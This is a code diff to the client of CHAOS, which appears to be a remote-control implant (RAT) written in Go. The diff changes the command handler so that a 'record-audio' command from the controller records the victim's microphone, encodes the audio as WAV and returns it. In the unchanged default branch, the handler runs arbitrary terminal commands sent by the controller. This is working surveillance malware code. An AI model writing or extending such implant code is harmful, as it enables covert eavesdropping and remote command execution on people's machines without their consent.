@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 	"net/http"
+	"reflect"
 	"strings"
 	"time"
 
@@ -13,6 +14,7 @@ import (
 	"github.com/justadoll/CHAOS/client/app/services"
 	"github.com/justadoll/CHAOS/client/app/shared/environment"
 	"github.com/justadoll/CHAOS/client/app/utilities/encode"
+	"github.com/moutend/go-wav"
 )
 
 type Handler struct {
@@ -232,8 +234,21 @@ func (h *Handler) HandleCommand() {
 				}
 				break
 			case "record-audio":
-				// fmt.Println("I should record audio!")
-				h.Services.Audio.Record(commandParts[1])
+				audio, err := h.Services.Audio.Record(commandParts[1])
+				if err != nil {
+					break
+				}
+				fmt.Println("audio type:", reflect.TypeOf(audio))
+				var file []byte
+				if response, err = wav.Marshal(audio); err != nil {
+					return
+				}
+				fmt.Println("file type: ", reflect.TypeOf(file))
+				/*
+					if err = ioutil.WriteFile("some_file.wav", file, 0644); err != nil {
+						return
+					}
+				*/
 			default:
 				response = encode.StringToByte(
 					h.Services.Terminal.Run(requestCommand.Request, h.Configuration.Connection.ContextDeadline))
